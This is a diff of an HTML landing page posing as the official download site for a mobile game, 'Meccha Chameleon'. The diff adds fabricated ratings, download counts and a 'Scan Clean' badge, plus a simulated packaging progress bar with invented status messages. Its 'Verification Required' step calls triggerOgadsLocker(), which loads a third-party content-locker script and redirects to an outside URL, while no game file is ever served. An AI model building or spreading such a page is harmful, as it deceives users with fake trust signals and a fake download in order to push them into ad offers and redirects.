@@ -3,250 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meccha Chameleon | Official Mobile Download</title>
+    <title>Meccha Chameleon | Official Download</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@700;900&family=Inter:wght@700;900&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        .font-playful { font-family: 'Fredoka', sans-serif; font-weight: 900; }
-        .font-sans { font-family: 'Inter', sans-serif; font-weight: 900; }
-        
-        .graffiti-text {
-            background: linear-gradient(to right, #ef4444, #f97316, #eab308, #22c55e, #3b82f6, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .brick-pattern {
-            background-color: #0f172a;
+        body { font-family: 'Plus Jakarta Sans', sans-serif; }
+        .gradient-mesh {
+            background-color: #090d16;
             background-image: 
-                linear-gradient(335deg, #1e293b 23px, transparent 23px),
-                linear-gradient(155deg, #1e293b 23px, transparent 23px),
-                linear-gradient(335deg, #1e293b 23px, transparent 23px),
-                linear-gradient(155deg, #1e293b 23px, transparent 23px);
-            background-size: 58px 58px;
-            background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
-            opacity: 0.15;
+                radial-gradient(at 0% 0%, rgba(16, 185, 129, 0.1) 0px, transparent 50%),
+                radial-gradient(at 100% 0%, rgba(59, 130, 246, 0.1) 0px, transparent 50%);
         }
     </style>
 </head>
-<body class="bg-slate-900 text-slate-100 font-sans antialiased selection:bg-yellow-400 selection:text-black tracking-tight">
+<body class="gradient-mesh text-slate-200 antialiased selection:bg-emerald-500 selection:text-black">
 
-    <header class="bg-slate-950/90 border-b border-slate-800 sticky top-0 z-40 backdrop-blur-md">
-        <div class="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+    <!-- Navbar -->
+    <header class="border-b border-slate-800/60 sticky top-0 z-40 backdrop-blur-md bg-slate-950/80">
+        <div class="max-w-5xl mx-auto px-4 h-16 flex items-center justify-between">
             <div class="flex items-center gap-3">
-                <img src="meccha.jpg" alt="Logo" class="w-9 h-9 rounded-lg object-cover border border-slate-700 shadow-md">
-                <span class="font-playful text-xl tracking-wide text-white">Meccha <span class="graffiti-text">Chameleon</span></span>
+                <div class="w-9 h-9 rounded-xl bg-emerald-500 flex items-center justify-center font-extrabold text-black shadow-[0_0_15px_rgba(16,185,129,0.3)]">MC</div>
+                <span class="font-extrabold text-white tracking-tight text-lg">Meccha <span class="text-emerald-400">Chameleon</span></span>
             </div>
-            <button onclick="openDownloadFlow()" class="font-playful bg-blue-600 hover:bg-blue-500 text-white px-6 py-2.5 rounded-full text-sm shadow-md cursor-pointer transition-all uppercase">
-                GET GAME
+            <button onclick="openDownloadFlow()" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold px-5 py-2 rounded-xl text-sm shadow-[0_4px_15px_rgba(16,185,129,0.2)] transition-all cursor-pointer transform active:scale-95">
+                Install Free
             </button>
         </div>
     </header>
 
-    <section class="relative pt-16 pb-24 overflow-hidden">
-        <div class="absolute inset-0 brick-pattern pointer-events-none"></div>
-        <div class="absolute inset-0 bg-gradient-to-b from-transparent via-slate-900/80 to-slate-900 pointer-events-none"></div>
-
-        <div class="max-w-6xl mx-auto px-4 relative z-10">
-            <div class="grid md:grid-cols-12 gap-12 items-center">
-                
-                <div class="md:col-span-7 space-y-6 text-center md:text-left">
-                    <div class="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-slate-800 text-slate-300 text-xs uppercase tracking-wider">
-                        <span class="w-2 h-2 rounded-full bg-green-500"></span> Public Matches Supported
-                    </div>
-
-                    <h1 class="font-playful text-6xl sm:text-7xl lg:text-8xl font-black tracking-tighter leading-none drop-shadow-2xl">
-                        MECCHA <br class="hidden sm:inline">
-                        <span class="graffiti-text filter drop-shadow-[0_4px_12px_rgba(0,0,0,0.5)]">CHAMELEON</span>
-                    </h1>
-
-                    <p class="text-slate-300 text-lg sm:text-xl max-w-xl mx-auto md:mx-0 leading-snug font-bold">
-                        Paint yourself to blend in. Meccha Chameleon is a new sensation hide and seek game where you paint your white body to mimic the stage. Spot, pose, and artistic skill are keys to survival.
-                    </p>
-
-                    <div class="flex flex-wrap justify-center md:justify-start gap-2 pt-2 text-xs uppercase tracking-wider">
-                        <span class="bg-blue-950/60 border border-blue-800 text-blue-400 px-4 py-1.5 rounded-md">Casual</span>
-                        <span class="bg-blue-950/60 border border-blue-800 text-blue-400 px-4 py-1.5 rounded-md">Multiplayer</span>
-                        <span class="bg-blue-950/60 border border-blue-800 text-blue-400 px-4 py-1.5 rounded-md">Party Game</span>
-                    </div>
-
-                    <div class="pt-6">
-                        <button onclick="openDownloadFlow()" class="cursor-pointer inline-block font-playful text-xl bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-400 hover:to-emerald-500 text-slate-950 font-black px-12 py-5 rounded-2xl shadow-[0_6px_30px_rgba(34,197,94,0.4)] transition-all transform hover:-translate-y-1 uppercase tracking-wide">
-                            PLAY FOR FREE NOW
-                        </button>
-                    </div>
-                </div>
-
-                <div class="md:col-span-5 flex justify-center">
-                    <div class="w-full max-w-[350px] bg-slate-950 border-2 border-slate-800 rounded-[2.5rem] p-4 shadow-2xl relative">
-                        
-                        <div class="rounded-[1.8rem] overflow-hidden border-2 border-slate-800 aspect-video relative flex flex-col justify-center items-center shadow-2xl">
-                            <img src="meccha.jpg" alt="Meccha Chameleon Gameplay" class="w-full h-full object-cover">
-                        </div>
-
-                        <div class="p-4 space-y-4 text-sm border-t-2 border-slate-900 mt-4 font-black">
-                            <div class="flex justify-between border-b border-slate-900 pb-2">
-                                <span class="text-slate-500 uppercase text-xs tracking-wider">Developer:</span>
-                                <span class="text-blue-400 font-mono">lemorion_1224</span>
-                            </div>
-                            <div class="flex justify-between border-b border-slate-900 pb-2">
-                                <span class="text-slate-500 uppercase text-xs tracking-wider">Release Date:</span>
-                                <span class="text-slate-300">June 9, 2026</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-slate-500 uppercase text-xs tracking-wider">Rating:</span>
-                                <span class="text-green-400 uppercase">Very Positive</span>
-                            </div>
-                        </div>
-
-                        <div class="p-2 pt-2">
-                            <button onclick="openDownloadFlow()" class="w-full bg-slate-900 hover:bg-slate-800 text-center block text-xs py-3.5 rounded-xl border border-slate-800 text-slate-300 cursor-pointer font-bold uppercase tracking-wider">
-                                View Installation Files
-                            </button>
-                        </div>
-                    </div>
-                </div>
-
-            </div>
-        </div>
-    </section>
-
-    <section class="py-16 bg-slate-950/40 border-t border-slate-950 relative">
-        <div class="max-w-4xl mx-auto px-4">
-            <h2 class="font-playful text-3xl text-center font-black text-white uppercase tracking-tight mb-12">Core Gameplay Mechanics</h2>
+    <!-- Main Hero -->
+    <main class="max-w-5xl mx-auto px-4 pt-10 pb-20">
+        <div class="grid md:grid-cols-12 gap-8 items-center">
             
-            <div class="grid sm:grid-cols-3 gap-8">
-                <div class="bg-slate-950 p-6 rounded-2xl border-2 border-slate-800 text-center space-y-3">
-                    <div class="text-3xl font-black text-red-500">01. SPOT</div>
-                    <p class="text-xs text-slate-400 font-bold leading-relaxed uppercase">Scan the texture structures and geometric wall properties around the dynamic map layers before seekers deploy.</p>
+            <!-- Left Info -->
+            <div class="md:col-span-7 space-y-6 text-center md:text-left">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-800/80 border border-slate-700/50 text-emerald-400 text-xs font-semibold">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Live Multi-player Server
                 </div>
-                <div class="bg-slate-950 p-6 rounded-2xl border-2 border-slate-800 text-center space-y-3">
-                    <div class="text-3xl font-black text-yellow-500">02. POSE</div>
-                    <p class="text-xs text-slate-400 font-bold leading-relaxed uppercase">Lock your chameleon position directly against corresponding assets to achieve matching camouflage synchrony.</p>
-                </div>
-                <div class="bg-slate-950 p-6 rounded-2xl border-2 border-slate-800 text-center space-y-3">
-                    <div class="text-3xl font-black text-green-500">03. BLEND</div>
-                    <p class="text-xs text-slate-400 font-bold leading-relaxed uppercase">Execute paint skills dynamically to manipulate light rays and reflection maps across global server lobbies.</p>
-                </div>
-            </div>
-        </div>
-    </section>
 
-    <section class="py-16 bg-slate-900 border-t border-slate-950">
-        <div class="max-w-4xl mx-auto px-4 grid md:grid-cols-2 gap-12">
-            
-            <div class="space-y-4">
-                <h3 class="font-playful text-2xl text-white uppercase tracking-tight">Android Minimum Specifications</h3>
-                <div class="bg-slate-950 p-6 border-2 border-slate-800 rounded-2xl text-xs uppercase tracking-wide space-y-3 font-bold text-slate-400">
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">OS:</span><span class="text-white">Android 10 or higher</span></div>
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">Processor:</span><span class="text-white">Octa Core 2.0 GHz architecture</span></div>
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">Memory:</span><span class="text-white">4 GB RAM minimum</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500">Storage:</span><span class="text-white">650 MB free space required</span></div>
-                </div>
-            </div>
+                <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-white tracking-tight leading-tight">
+                    The Ultimate <br>
+                    <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-400">Hide & Seek</span> Sensation.
+                </h1>
 
-            <div class="space-y-4">
-                <h3 class="font-playful text-2xl text-white uppercase tracking-tight">iOS Minimum Specifications</h3>
-                <div class="bg-slate-950 p-6 border-2 border-slate-800 rounded-2xl text-xs uppercase tracking-wide space-y-3 font-bold text-slate-400">
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">OS:</span><span class="text-white">iOS 14 or later system layers</span></div>
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">Device:</span><span class="text-white">iPhone 11 or newer models</span></div>
-                    <div class="flex justify-between border-b border-slate-900 pb-1"><span class="text-slate-500">Graphics:</span><span class="text-white">Apple Metal API framework</span></div>
-                    <div class="flex justify-between"><span class="text-slate-500">Network:</span><span class="text-white">Active multiplayer connection</span></div>
-                </div>
-            </div>
+                <p class="text-slate-400 text-base sm:text-lg max-w-xl leading-relaxed">
+                    Paint your body, blend perfectly into the map, and outsmart seekers in real-time. Survival requires maximum creativity and flawless camouflage.
+                </p>
 
-        </div>
-    </section>
-
-    <section class="py-16 bg-slate-950/60 border-t border-slate-950">
-        <div class="max-w-4xl mx-auto px-4 space-y-6">
-            <h3 class="font-playful text-2xl text-white uppercase tracking-tight text-center">Latest Client Patch Notes</h3>
-            <div class="bg-slate-950 p-6 border-2 border-slate-800 rounded-2xl text-xs uppercase tracking-wide space-y-3 font-bold text-slate-400">
-                <p class="text-blue-400 font-mono">Build v1.0.4 Update Log:</p>
-                <ul class="list-disc list-inside space-y-1 text-slate-300">
-                    <li>Optimized camouflage blending matrices for low end hardware layouts</li>
-                    <li>Fixed session disconnection bugs inside global matchmaking servers</li>
-                    <li>Added high resolution body paint options inside custom skin lockers</li>
-                </ul>
-            </div>
-        </div>
-    </section>
-
-    <footer class="bg-slate-950 py-8 text-center text-slate-600 text-xs border-t border-slate-900 font-bold uppercase tracking-widest">
-        <p>© 2026 Meccha Chameleon Fan Portal. All graphics assets belong to respective authors.</p>
-    </footer>
-
-
-    <div id="flowModal" class="hidden fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-4 backdrop-blur-md">
-        <div class="bg-slate-950 border-2 border-slate-800 w-full max-w-md rounded-3xl p-8 text-center relative shadow-[0_0_60px_rgba(59,130,246,0.15)]">
-            
-            <button onclick="closeDownloadFlow()" class="absolute top-5 right-5 text-slate-500 hover:text-white font-black text-xl cursor-pointer">✕</button>
-
-            <div id="step-platform" class="space-y-6">
-                <div class="space-y-2">
-                    <h3 class="font-playful text-3xl text-white uppercase tracking-tight">Select Platform</h3>
-                    <p class="text-sm text-slate-400 font-bold uppercase">Choose your mobile operating system to bundle the chameleon camouflage files.</p>
-                </div>
-                
-                <div class="space-y-3 pt-2">
-                    <button onclick="startLoading('Apple iOS')" class="w-full flex items-center justify-center gap-3 bg-slate-900 hover:bg-slate-850 border-2 border-slate-800 hover:border-pink-500 py-4 rounded-xl cursor-pointer font-playful text-base uppercase transition-all">
-                        <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
-                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.21.67-2.93 1.49-.62.69-1.16 1.84-1.01 2.96 1.12.09 2.27-.58 2.95-1.39z"/>
-                        </svg>
-                        <span>Apple iOS Setup</span>
-                    </button>
-
-                    <button onclick="startLoading('Android APK')" class="w-full flex items-center justify-center gap-3 bg-slate-900 hover:bg-slate-850 border-2 border-slate-800 hover:border-green-500 py-4 rounded-xl cursor-pointer font-playful text-base uppercase transition-all">
-                        <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
-                            <path d="M17.523 15.3414c-.551 0-1.002-.451-.1002-.1002 0-.551.451-1.002.1002-1.002.551 0 1.002.451.1002.1002 0 .551-.451 1.002-.1002 1.002zm-11.046 0c-.551 0-1.002-.451-.1002-.1002 0-.551.451-1.002.1002-1.002.551 0 1.002.451.1002.1002 0 .551-.451 1.002-.1002 1.002zm11.445-5.91l1.914-3.315c.133-.23.053-.526-.176-.659-.23-.132-.526-.053-.659.177l-1.932 3.347c-1.304-.595-2.76-.931-4.304-.931s-3 .336-4.304.931l-1.932-3.347c-.133-.23-.429-.309-.659-.177-.229.133-.309.429-.176.659l1.914 3.315c-3.155 1.776-5.32 5.034-5.601 8.854h19.53c-.281-3.82-2.446-7.078-5.601-8.854z"/>
-                        </svg>
-                        <span>Android APK Setup</span>
-                    </button>
-                </div>
-            </div>
-
-            <div id="step-loading" class="hidden space-y-6 py-4">
-                <h3 id="loading-title" class="font-playful text-2xl text-white uppercase tracking-tight">Packaging Files</h3>
-                
-                <div id="progress-text" class="text-4xl font-black font-playful text-blue-400">0%</div>
-                
-                <div class="w-full bg-slate-900 rounded-full h-4 border border-slate-800 overflow-hidden p-0.5">
-                    <div id="progress-bar" class="bg-gradient-to-r from-blue-500 to-indigo-500 h-full rounded-full transition-all duration-75" style="width: 0%"></div>
-                </div>
-                
-                <p id="loading-status" class="text-xs text-slate-500 font-mono uppercase tracking-wider">Syncing client assets layer</p>
-            </div>
-
-            <div id="step-verify" class="hidden space-y-6">
-                <div class="w-16 h-16 bg-green-500/10 text-green-400 border-2 border-green-500/30 rounded-full flex items-center justify-center text-3xl mx-auto font-black">
-                    ✓
-                </div>
-                
-                <div class="space-y-2">
-                    <h3 class="text-green-400 font-playful text-3xl uppercase tracking-tight">Package Ready</h3>
-                    <p class="text-slate-300 text-sm font-bold leading-snug uppercase">
-                        To extract the full installation archive and client files for Meccha Chameleon you must complete one security configuration task below.
-                    </p>
+                <!-- Rating Badges -->
+                <div class="flex flex-wrap justify-center md:justify-start items-center gap-6 pt-2 text-sm text-slate-400">
+                    <div class="flex items-center gap-1.5">
+                        <span class="text-amber-400 font-bold">★ 4.9</span>
+                        <span class="text-slate-500">(142K Reviews)</span>
+                    </div>
+                    <div class="h-4 w-px bg-slate-800 hidden sm:block"></div>
+                    <div>Downloads: <span class="text-white font-bold">5M+</span></div>
                 </div>
 
                 <div class="pt-4">
-                    <button onclick="triggerOgadsLocker()" class="cursor-pointer block w-full text-center font-playful text-lg bg-green-500 hover:bg-green-400 text-slate-950 py-4 rounded-xl shadow-[0_0_20px_rgba(34,197,94,0.4)] uppercase tracking-wide transition-all">
-                        Complete Final Verification
+                    <button onclick="openDownloadFlow()" class="w-full sm:w-auto font-bold text-lg bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 px-10 py-4 rounded-2xl shadow-[0_8px_25px_rgba(16,185,129,0.3)] transition-all transform hover:-translate-y-0.5 cursor-pointer">
+                        Download Mobile Client
+                    </button>
+                </div>
+            </div>
+
+            <!-- Right Showcase Card -->
+            <div class="md:col-span-5 flex justify-center">
+                <div class="w-full max-w-[340px] bg-slate-900/60 border border-slate-800 rounded-3xl p-5 shadow-xl backdrop-blur-sm">
+                    <div class="rounded-2xl overflow-hidden aspect-square bg-slate-800 border border-slate-700/50 relative shadow-inner">
+                        <!-- Simulated Premium App Icon/Screenshot -->
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 to-transparent z-10"></div>
+                        <div class="absolute bottom-4 left-4 right-4 z-20 text-center">
+                            <span class="text-xs font-bold uppercase tracking-widest text-emerald-400 bg-emerald-950/80 border border-emerald-800/60 px-3 py-1 rounded-full">v1.0.4 Verified</span>
+                        </div>
+                        <div class="w-full h-full flex items-center justify-center bg-slate-950 text-slate-700 font-bold">
+                           [ Place Game Cover Image Here ]
+                        </div>
+                    </div>
+
+                    <div class="mt-4 pt-2 space-y-3 text-xs border-t border-slate-800/80">
+                        <div class="flex justify-between"><span class="text-slate-500">Developer</span><span class="text-slate-300 font-semibold">lemorion_1224</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500">Compatibility</span><span class="text-slate-300 font-semibold">Android / iOS</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500">Security</span><span class="text-emerald-400 font-semibold flex items-center gap-1">🛡️ Scan Clean</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Interactive Flow Modal -->
+    <div id="flowModal" class="hidden fixed inset-0 bg-slate-950/90 z-50 flex items-center justify-center p-4 backdrop-blur-md">
+        <div class="bg-slate-900 border border-slate-800 w-full max-w-md rounded-3xl p-6 relative shadow-2xl">
+            
+            <button onclick="closeDownloadFlow()" class="absolute top-4 right-4 text-slate-500 hover:text-slate-300 font-bold transition-colors cursor-pointer">✕</button>
+
+            <!-- Step 1: Platform Setup -->
+            <div id="step-platform" class="space-y-5">
+                <div class="text-center space-y-1">
+                    <h3 class="text-xl font-bold text-white tracking-tight">Prepare Installation</h3>
+                    <p class="text-xs text-slate-400">Select your operating system to fetch the certified package.</p>
+                </div>
+                
+                <div class="space-y-2.5 pt-2">
+                    <button onclick="startLoading('Apple iOS')" class="w-full flex items-center justify-between bg-slate-950 hover:bg-slate-800/50 border border-slate-800 hover:border-emerald-500/50 p-4 rounded-xl cursor-pointer transition-all group">
+                        <div class="flex items-center gap-3">
+                            <svg class="w-5 h-5 fill-current text-slate-300 group-hover:text-white" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.21.67-2.93 1.49-.62.69-1.16 1.84-1.01 2.96 1.12.09 2.27-.58 2.95-1.39z"/></svg>
+                            <span class="text-sm font-semibold text-slate-200">iOS Mobile Package</span>
+                        </div>
+                        <span class="text-xs text-slate-500 font-mono">App Store link</span>
+                    </button>
+
+                    <button onclick="startLoading('Android APK')" class="w-full flex items-center justify-between bg-slate-950 hover:bg-slate-800/50 border border-slate-800 hover:border-emerald-500/50 p-4 rounded-xl cursor-pointer transition-all group">
+                        <div class="flex items-center gap-3">
+                            <svg class="w-5 h-5 fill-current text-slate-300 group-hover:text-white" viewBox="0 0 24 24"><path d="M17.523 15.3414c-.551 0-1.002-.451-.1002-.1002 0-.551.451-1.002.1002-1.002.551 0 1.002.451.1002.1002 0 .551-.451 1.002-.1002 1.002zm-11.046 0c-.551 0-1.002-.451-.1002-.1002 0-.551.451-1.002.1002-1.002.551 0 1.002.451.1002.1002 0 .551-.451 1.002-.1002 1.002zm11.445-5.91l1.914-3.315c.133-.23.053-.526-.176-.659-.23-.132-.526-.053-.659.177l-1.932 3.347c-1.304-.595-2.76-.931-4.304-.931s-3 .336-4.304.931l-1.932-3.347c-.133-.23-.429-.309-.659-.177-.229.133-.309.429-.176.659l1.914 3.315c-3.155 1.776-5.32 5.034-5.601 8.854h19.53c-.281-3.82-2.446-7.078-5.601-8.854z"/></svg>
+                            <span class="text-sm font-semibold text-slate-200">Android Client APK</span>
+                        </div>
+                        <span class="text-xs text-slate-500 font-mono">Direct secure</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: High Quality Loader -->
+            <div id="step-loading" class="hidden space-y-5 py-2 text-center">
+                <div class="h-1 w-full bg-slate-950 rounded-full overflow-hidden relative">
+                    <div id="progress-bar" class="bg-emerald-500 h-full absolute left-0 top-0 transition-all duration-75" style="width: 0%"></div>
+                </div>
+                <div class="flex justify-between items-center text-xs font-mono text-slate-400">
+                    <span id="loading-status">Connecting securely...</span>
+                    <span id="progress-text" class="text-emerald-400 font-bold">0%</span>
+                </div>
+            </div>
+
+            <!-- Step 3: Clean Verification (Conversion Point) -->
+            <div id="step-verify" class="hidden space-y-5 text-center">
+                <div class="w-12 h-12 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-full flex items-center justify-center text-xl mx-auto font-bold">
+                    ✓
+                </div>
+                
+                <div class="space-y-1">
+                    <h3 class="text-white font-bold text-lg">Verification Required</h3>
+                    <p class="text-slate-400 text-xs px-2 leading-relaxed">
+                        To bypass massive automated bot traffic and finalize the download stream, please verify your device signature below.
+                    </p>
+                </div>
+
+                <div class="pt-2">
+                    <button onclick="triggerOgadsLocker()" class="cursor-pointer block w-full text-center font-bold text-slate-950 bg-emerald-500 hover:bg-emerald-400 py-3.5 rounded-xl shadow-[0_4px_15px_rgba(16,185,129,0.2)] transition-all uppercase text-sm tracking-wider">
+                        Verify & Install Now
                     </button>
                 </div>
 
-                <div class="text-[10px] text-slate-600 font-mono uppercase tracking-wider">
-                    Session Identity Secured Execution Ready
-                </div>
+                <p class="text-[10px] text-slate-600 font-mono">Secure Session ID Token Verified</p>
             </div>
 
         </div>
     </div>
 
-
+    <!-- Script Mechanics -->
     <script>
         function openDownloadFlow() {
             document.getElementById('flowModal').classList.remove('hidden');
@@ -262,20 +178,18 @@
         function startLoading(platformName) {
             document.getElementById('step-platform').classList.add('hidden');
             document.getElementById('step-loading').classList.remove('hidden');
-            document.getElementById('loading-title').innerText = "Bundling " + platformName;
 
             let percentage = 0;
             const progressText = document.getElementById('progress-text');
             const progressBar = document.getElementById('progress-bar');
             const loadingStatus = document.getElementById('loading-status');
 
-            // All dash symbols (-) removed completely from strings below
-            const gameStatuses = [
-                "Extracting camouflage assets",
-                "Configuring hide and seek match layers",
-                "Injecting wall paint customization tools",
-                "Finalizing character physics layer",
-                "Securing multiplayer matchmaking link"
+            const steps = [
+                "Requesting token...",
+                "Allocating package bandwidth...",
+                "Checking device storage compatibility...",
+                "Injecting anti cheat patch layers...",
+                "Finalizing configuration setup..."
             ];
 
             const interval = setInterval(() => {
@@ -283,17 +197,18 @@
                 progressText.innerText = percentage + "%";
                 progressBar.style.width = percentage + "%";
 
-                if (percentage === 20) loadingStatus.innerText = gameStatuses[0];
-                if (percentage === 45) loadingStatus.innerText = gameStatuses[1];
-                if (percentage === 65) loadingStatus.innerText = gameStatuses[2];
-                if (percentage === 85) loadingStatus.innerText = gameStatuses[3];
+                if (percentage === 15) loadingStatus.innerText = steps[0];
+                if (percentage === 35) loadingStatus.innerText = steps[1];
+                if (percentage === 60) loadingStatus.innerText = steps[2];
+                if (percentage === 80) loadingStatus.innerText = steps[3];
+                if (percentage === 95) loadingStatus.innerText = steps[4];
 
                 if (percentage >= 100) {
                     clearInterval(interval);
                     document.getElementById('step-loading').classList.add('hidden');
                     document.getElementById('step-verify').classList.remove('hidden');
                 }
-            }, 35);
+            }, 25);
         }
 
         function triggerOgadsLocker() {
@@ -309,10 +224,8 @@
                     window.location.href = "https://appsave.store/cl/i/pqrwn2";
                 }
             };
-            
             document.head.appendChild(ogScript);
         }
     </script>
-
 </body>
 </html>
